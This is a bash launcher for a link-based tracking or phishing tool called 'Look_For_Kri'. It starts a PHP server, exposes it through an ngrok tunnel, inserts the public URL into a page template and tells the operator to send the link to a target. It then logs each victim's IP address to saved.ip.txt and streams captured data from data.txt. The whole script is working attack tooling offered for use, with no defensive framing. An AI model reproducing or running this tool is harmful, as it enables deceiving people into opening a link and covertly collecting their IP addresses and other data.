#!/bin/bash
# Alternative method using ngrok
# Look_For_Kri v 1.0 - Ngrok Method

printf "\e[1;92m[\e[0m+\e[1;92m] Setting up Look_For_Kri with Ngrok...\e[0m\n"

# Check for ngrok
if ! command -v ngrok &> /dev/null; then
    printf "\e[1;31m[!] Ngrok is not installed!\e[0m\n"
    printf "\e[1;33m[*] Install ngrok:\e[0m\n"
    printf "\e[1;33m    Linux: Download from https://ngrok.com/download\e[0m\n"
    printf "\e[1;33m    Termux: pkg install ngrok\e[0m\n"
    exit 1
fi

# Start PHP server
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port 8080...\e[0m\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

# Start ngrok
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\e[0m\n"
ngrok http 8080 > ngrok.log 2>&1 &
NGROK_PID=$!
sleep 5

# Get ngrok URL
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | head -1 | cut -d'"' -f4)

if [[ -z "$NGROK_URL" ]]; then
    printf "\e[1;31m[!] Failed to get ngrok URL\e[0m\n"
    printf "\e[1;33m[*] Check ngrok.log for details\e[0m\n"
    kill $PHP_PID 2>/dev/null
    kill $NGROK_PID 2>/dev/null
    exit 1
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok URL:\e[0m\e[1;77m %s\e[0m\n" $NGROK_URL
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the target\e[0m\n"

# Update index.php with ngrok URL
sed "s+forwarding_link+$NGROK_URL+g" template.php > index.php

# Wait for connections
printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for targets... Press Ctrl+C to exit\e[0m\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        printf "\e[1;93m[\e[0m+\e[1;93m] IP: \e[0m\e[1;77m %s\e[0m\n" $ip
        cat ip.txt >> saved.ip.txt
        rm -rf ip.txt
        tail -f -n 110 data.txt
    fi
    sleep 0.5
done